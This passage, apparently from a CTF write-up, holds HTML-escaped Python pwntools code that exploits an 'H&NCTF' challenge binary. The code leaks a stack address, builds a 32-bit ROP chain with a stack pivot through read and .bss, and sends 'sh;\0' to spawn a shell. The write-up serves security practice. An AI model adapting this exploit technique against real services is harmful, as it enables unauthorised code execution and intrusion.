an&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;connect&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; remote(IP, PORT) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; is_debug &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; process()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;g = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: gdb.attach(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.send(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.sendline(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x, y: p.sendafter(x, y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x, y: p.sendlineafter(x, y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x=&lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;: p.recv() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; p.recv(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.recvuntil(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r_leak_libc_64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r_leak_libc_32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = connect()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to H&amp;amp;NCTF, my friend. What&amp;#x27;s your name?&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak = u32(r(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf_addr = leak - (&lt;span class=&#34;number&#34;&gt;0xfff93748&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xfff93710&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;success(&lt;span class=&#34;string&#34;&gt;f&amp;quot;buf_addr -&amp;gt;&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(buf_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read = elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = &lt;span class=&#34;number&#34;&gt;0x08048639&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bss = &lt;span class=&#34;number&#34;&gt;0x804a000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;number&#34;&gt;0x0804857D&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(read) + p32(vuln) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(bss) + p32(&lt;span class=&#34;number&#34;&gt;0x4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x2c&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;) + p32(buf_addr - &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;time.sleep(&lt;span class=&#34;number&#34;&gt;0.3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# g(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;sh;\0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to H&amp;amp;NCTF, my friend. What&amp;#x27;s your name?&amp;quot;&lt;/span&gt;)&lt;/span&gt